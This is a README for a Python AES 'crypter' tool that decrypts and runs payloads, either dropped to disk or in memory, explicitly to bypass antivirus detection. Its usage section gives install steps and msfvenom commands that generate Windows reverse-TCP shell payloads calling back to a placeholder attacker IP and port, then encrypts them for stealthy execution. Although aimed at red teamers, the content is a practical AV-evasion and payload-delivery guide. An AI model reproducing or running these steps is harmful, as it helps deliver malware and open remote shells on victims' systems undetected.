# 🔐 AES Crypter - Scantime & Runtime

This is a simple AES-based crypter project with two modes:

- **Scantime Crypter**: decrypts and drops an encrypted `.exe` to disk, then runs it.
- **Runtime Crypter**: decrypts and executes raw shellcode directly in memory (no file drop).

Both versions are written in Python and support custom payloads.

---

## 💡 Why use it?

Crypters are useful for obfuscating or encrypting payloads to bypass antivirus detection.  
This tool is ideal for red teamers, penetration testers, or researchers who want to test AV evasion techniques and execute payloads with higher stealth — especially in restricted environments.

<p align="center">
  <img src="demo.gif" alt="Demo">
</p>

---

## 🚀 Usage

### 1. Install the dependencies

- `pip install pycryptodome`
- `pip install pyinstaller`

### 2. Generate your payload

- For runtime:
  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o payload.bin`

- For scantime:
  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o payload.exe`

### 3. Encrypt your payload

- `python.exe scantime/runtime.py payload.exe/.bin`

